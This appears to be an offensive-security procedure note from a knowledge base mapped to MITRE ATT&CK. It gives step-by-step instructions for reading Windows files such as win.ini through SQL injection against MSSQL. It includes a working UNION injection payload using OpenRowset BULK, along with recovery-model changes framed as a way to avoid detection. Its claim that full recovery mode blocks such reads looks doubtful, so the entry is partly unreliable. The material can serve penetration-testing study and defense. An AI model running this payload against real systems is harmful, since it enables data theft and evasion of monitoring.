---
id: 8c552990-a92c-4f85-99e0-173f57d298be
name: MSSQL-Read-File-via-INI-Disclosure
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:33.922224+00:00'
updated_at: '2023-04-10T20:22:42.008363+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059.001 - Command and
    Scripting Interpreter: SQL]]
  - '[[techniques/Data-from-Local-System|T1005 - Data from Local System]]'
sub_techniques: []
tags:
  - '[[tags/MSSQL-Injection]]'
  - '[[tags/MSSQL-Read-File]]'
commands:
  - '[[commands/mssql-check-recovery-model]]'
  - '[[commands/mssql-switch-to-bulk-logged-recovery]]'
  - '[[commands/mssql-switch-back-to-full-recovery]]'
platforms:
  - Windows
tools: []
validated: true
---

# MSSQL-Read-File-via-INI-Disclosure

## Summary

This procedure exploits a SQL injection vulnerability in an MSSQL server to read sensitive files, such as the Windows win.ini configuration file, by leveraging the OpenRowset function with BULK operations. It requires temporarily switching the database recovery model to bulk-logged to enable file access, allowing attackers to extract configuration details like server names or credentials without direct file system access.

## Description

In a typical attack scenario, an attacker with SQL injection access to an MSSQL instance (often via a web application) can execute arbitrary SQL commands. This procedure uses the BULK option within OpenRowset to treat a file as a data source and read its contents into a query result. The technique relies on the database being in bulk-logged or simple recovery mode, as full recovery mode restricts such operations for logging reasons. Once the file contents are retrieved, the database is switched back to prevent detection or further logging issues. This is particularly useful in discovery phases to gather system configuration, credentials, or other sensitive data from INI files, which may reveal network paths, database connections, or application settings. The target environment is typically a Windows server running MSSQL, accessible remotely via SQL injection points.

## Requirements

1. Valid SQL injection vulnerability in an MSSQL database (e.g., via a web app parameter).
2. Authentication or unauthenticated access to execute SQL commands on the target database.
3. Knowledge of the target file path (e.g., C:\Windows\win.ini for standard Windows INI files).
4. SQL client tool like sqlcmd, or integration with a web proxy like Burp Suite for injection delivery.

## Defense

- Implement strict input validation and parameterized queries to prevent SQL injection.
- Monitor MSSQL logs for unusual recovery model changes (e.g., via SQL Server Audit) and BULK operations.
- Restrict database permissions to deny execution of xp_cmdshell or OpenRowset for untrusted users.
- Enable full recovery model by default and alert on mode switches.

## Objectives

1. Verify and adjust the database recovery model to allow BULK file operations.
2. Execute SQL injection to read the contents of a target INI file using OpenRowset.
3. Restore the database to its original recovery model to minimize logging footprints.
4. Extract sensitive configuration data for further network compromise.

## Instructions

### Step 1: Check Current Database Recovery Model

**Context**: Before attempting file reads, confirm the database's recovery model. BULK operations require bulk-logged or simple mode; if it's full, switch it temporarily to avoid errors.

**Command** ([[commands/mssql-check-recovery-model]]):
```sql
USE master
GO
SELECT [name], [recovery_model_desc] FROM sys.databases WHERE [name] = 'database_name'
```

> This query lists the recovery model (e.g., FULL, BULK_LOGGED). If it's FULL, proceed to switch; otherwise, skip to file read. Expected output shows the model description.

### Step 2: Switch Database to Bulk-Logged Recovery Model

**Context**: Temporarily change the recovery model to bulk-logged to enable OpenRowset BULK access without extensive logging. This step is necessary if the current model is FULL.

**Command** ([[commands/mssql-switch-to-bulk-logged-recovery]]):
```sql
ALTER DATABASE database_name SET RECOVERY BULK_LOGGED
GO
```

> Executes the alteration; verify with Step 1 command. Success is confirmed if no errors occur and a subsequent check shows BULK_LOGGED.

### Step 3: Read File Contents via OpenRowset BULK

**Context**: Inject the SQL payload via the vulnerability to read the INI file. This unions the file contents into the query result, bypassing normal access controls.

**Code** ([[codes/mssql-openrowset-bulk-file-read]]):
```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

> Deliver this via SQL injection (e.g., in a UNION-based vuln). The BULK clause reads the file as a single CLOB; adjust the path for other INI files. Expected output includes the file contents in the second column of the result set.

### Step 4: Switch Database Back to Full Recovery Model

**Context**: Restore the original recovery model to reduce suspicion and ensure proper transaction logging resumes.

**Command** ([[commands/mssql-switch-back-to-full-recovery]]):
```sql
ALTER DATABASE database_name SET RECOVERY FULL
GO
```

> Confirms the change; re-run the check command to verify. Success if model reverts without errors.
